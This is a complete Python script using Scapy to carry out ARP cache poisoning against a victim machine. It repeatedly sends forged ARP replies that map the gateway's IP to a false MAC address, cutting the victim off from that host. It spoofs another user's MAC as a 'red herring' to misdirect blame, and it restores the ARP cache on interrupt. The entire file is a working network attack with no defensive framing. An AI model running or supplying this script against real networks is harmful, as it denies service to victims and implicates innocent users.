#!/usr/bin/env python

from scapy.all import *
import time
import signal
import sys

victimIP = "192.168.56.105"		#IP address of who we poison
victimMAC = "08:00:27:49:32:8b"		#MAC address ""

myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
					#set as another users MAC for Red herring attempt

deadEndIP = "192.168.1.1"		#IP address of host we dont want victim to talk to
deadEndMAC = "84:a6:c8:af:12:ed"	#MAC address ""

killMAC = "08:00:27:ff:ff:fe"		#False MAC address


#Creating Poisoning packet

#Ethernet*****************
pkt = Ether()/ARP()	
pkt.dst = victimMAC		#Ethernet Destination
pkt.src = myMAC			#Ethernet Source
#*************************

#ARP**********************
pkt.pdst= victimIP		# (IP)
pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
pkt.psrc = deadEndIP		# if you're trying to talk to...
pkt.hwsrc = killMAC		# His MAC address is ...
pkt.op = 2			# that's where he's at (is-at)
#*************************


print("Turn out the lights....")

try:
	while True:
		sendp(pkt, iface="eth0")
		time.sleep(2)

except KeyboardInterrupt:
	print("Re-ARPing....")
	heal = Ether()/ARP()
	heal.src = myMAC
	heal.dst = victimMAC
	heal.hwsrc = deadEndMAC
	heal.hwdst = victimMAC
	heal.pdst = victimIP
	heal.psrc = deadEndIP
	heal.op = 2

	for i in range(0, 5):
		sendp(heal, iface="eth0")
		time.sleep(1)

	sys.exit(0)
